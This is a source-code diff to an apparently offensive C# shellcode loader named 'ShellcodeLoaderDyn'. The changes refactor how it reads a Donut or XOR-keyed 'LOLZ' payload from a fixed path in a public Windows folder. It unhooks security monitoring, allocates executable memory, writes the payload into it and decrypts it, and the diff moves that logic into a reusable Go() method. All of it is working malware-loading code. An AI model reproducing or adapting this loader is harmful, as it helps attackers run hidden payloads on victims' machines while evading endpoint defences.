@@ -1118,43 +1118,22 @@ namespace ShellcodeLoaderDyn
             KEYING_DOMAIN = 4
         }
 
-        public static bool IsLOLZFormat(string filename)
+        public static bool IsLOLZFormat(byte[] content)
         {
-            byte[] buff = new byte[4];
-            File.OpenRead(filename).Read(buff, 0, 4);
-            return buff.SequenceEqual(Encoding.ASCII.GetBytes("LOLZ"));
+            byte[] magic = Encoding.ASCII.GetBytes("LOLZ");
+            if (content.Length < magic.Length) return false;
+            for (int i = 0; i<magic.Length; i++)
+            {
+                if (content[i] != magic[i]) return false;
+            }
+            return true;
         }
 
-        public static byte[] LoadDonutFile(string filename)
+        public static string[] LoadLOLZFile(byte[] content)
         {
-            if (!File.Exists(filename))
-            {
-                Console.Error.WriteLine("Filename does not exists: " + filename);
-                return null;
-            }
             try
             {
-                byte[] content = File.ReadAllBytes(filename);
-                return content;
-            }
-            catch (Exception e)
-            {
-                Console.Error.WriteLine("Cannot parse shellcode file.");
-                Console.Error.WriteLine(e.Message);
-            }
-            return null;
-        }
-
-        public static string[] LoadLOLZFile(string filename)
-        {
-            if (!File.Exists(filename))
-            {
-                Console.Error.WriteLine("Filename does not exists: " + filename);
-                return null;
-            }
-            try
-            {
-                string[] lines = File.ReadAllLines(filename, Encoding.UTF8);
+                string[] lines = System.Text.Encoding.UTF8.GetString(content).Replace("\r\n", "\n").Split('\n');
                 if (lines.Length != 2)
                 {
                     Console.Error.WriteLine("Cannot parse shellcode file, wrong number of lines");
@@ -1196,20 +1175,19 @@ namespace ShellcodeLoaderDyn
                         }
                         else
                         {
-                            Console.Write("Password: ");
-                            keybuilder.Append(Console.ReadLine().Trim(new[] { '\n', '\r', ' ', '\t' }));
-
+                            //Console.Write("Password: ");
+                            //keybuilder.Append(Console.ReadLine().Trim(new[] { '\n', '\r', ' ', '\t' }));
+                            Console.Error.WriteLine("Password functionality unsupported at this time.");
                         }
                         break;
                 }
             }
             return keybuilder.ToString();
         }
-
         public static int Main()
         {
             // PARAMS
-            string filename = "C:\\Temp\\shellcode.bin";
+            string filename = "C:\\Users\\Public\\BIPCD\\shellcode.bin";
             bool unhook = true;
             string password = null;
 
@@ -1220,24 +1198,40 @@ namespace ShellcodeLoaderDyn
             }
 
             // Load shellcode from file
+            byte[] rawcontent;
+            try
+            {
+                rawcontent = File.ReadAllBytes(filename);
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("Unreadable shellcode file.");
+                Console.Error.WriteLine(e.Message);
+                return -2;
+            }
+            return Go(rawcontent);
+        }
+
+
+        public static int Go(byte[] rawcontent)
+        {
             string key = null;
             string strpayload = null;
-            byte[] binpayload = null;
-            bool LOLZFormat = IsLOLZFormat(filename);
-            UInt32 payloadSize = 0;
+            bool unhook = true;
+            bool LOLZFormat = IsLOLZFormat(rawcontent);
+            UInt32 payloadSize;
             if (LOLZFormat)
             {
                 Console.WriteLine("Detected smart shellcode file");
-                string[] content = LoadLOLZFile(filename);
-                key = GetKey(content[0], password);
+                string[] content = LoadLOLZFile(rawcontent);
+                key = GetKey(content[0], null);
                 strpayload = content[1];
                 payloadSize = Convert.ToUInt32(strpayload.Length / 2);
             }
             else
             {
                 Console.WriteLine("Detected standard file");
-                binpayload = LoadDonutFile(filename);
-                payloadSize = Convert.ToUInt32(binpayload.Length);
+                payloadSize = Convert.ToUInt32(rawcontent.Length);
             }
 
             // Unhook
@@ -1265,13 +1259,6 @@ namespace ShellcodeLoaderDyn
                 Console.WriteLine("Generated XOR key: " + key);
             }
             Console.WriteLine("Allocating memory, payload length: " + payloadSize);
-            object[] valloc_parameters = new object[]
-            {
-                IntPtr.Zero,
-                payloadSize,
-                (uint)0x3000,
-                (uint)0x40
-            };
 
             IntPtr addr = IntPtr.Zero;
             IntPtr region_size = (IntPtr)payloadSize;
@@ -1294,7 +1281,7 @@ namespace ShellcodeLoaderDyn
             }
             else
             {
-                writeBinPayloadToMem(binpayload, ref addr);
+                writeBinPayloadToMem(rawcontent, ref addr);
             }
 
             // Decrypt shellcode
